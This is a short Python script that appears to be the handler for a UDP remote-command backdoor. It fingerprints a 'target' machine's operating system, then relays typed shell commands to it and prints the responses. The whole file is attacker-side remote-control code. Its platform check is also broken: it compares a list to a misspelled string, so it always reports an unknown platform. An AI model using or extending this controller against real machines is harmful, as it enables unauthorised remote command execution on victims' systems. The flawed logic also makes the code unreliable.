import socket,time,subprocess,os
# creating socket 
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
# binding socket
# address 
target_address=("127.0.0.1",8889) 
user=input("enter your handler.. ")
os.system('clear')
print(" \t \t \t \t Welcome ",user)
print("Checking target platform ")
waitos="ok google"
s.sendto(waitos.encode('ascii'), target_address)
os_check=s.recvfrom(10)
print(os_check)
list_os=['win32','darwin','linux']
oss=[i for i in list_os if os_check[0].decode('ascii') in i]
if oss == 'darwain' :
    print("Target OS detected Mac")
    time.sleep(1)
    print("So type Mac related COmmands only ")
else  : 
    print("Unknow platform .")
    
while True:
    cmd=input("enter command :- ]  ")
    # sending data to server 
    if cmd == 'exit' or cmd == 'logout' :
        print("Closing gates...")
        time.sleep(2)
        exit()
    else : 
        s.sendto(cmd.encode('ascii'), target_address)
        print("Instruction sent waiting for response")
        data=s.recvfrom(20)
        print(data[0].decode('ascii'))


